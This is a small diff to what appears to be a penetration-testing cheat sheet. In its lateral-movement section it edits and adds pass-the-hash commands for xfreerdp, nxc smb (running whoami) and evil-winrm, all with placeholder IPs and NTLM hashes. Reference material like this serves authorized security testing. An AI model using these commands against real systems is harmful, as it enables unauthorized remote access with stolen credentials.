@@ -293,8 +293,9 @@ dns.sb 185.222.222.222, 45.11.45.11
 Lateral mouvement
 ---
 ```
-xfreerdp /v:10.10.10.10 /u:mon.user /pth:1234567894561zeyreye /cert:ignore
-nxc smb 10.10.10.10 --local-auth -u administrator -H 13213212121211212dfhgshsghgfd -x whoami 
+xfreerdp /v:10.10.10.10 /u:mon.user /pth:123456789123456789 /cert:ignore
+nxc smb 10.10.10.10 --local-auth -u administrator -H 123456789123456789 -x whoami
+evil-winrm -i 10.10.10.10 -u "mon.user" -H 123456789123456789 
 ```
 
 Wifi
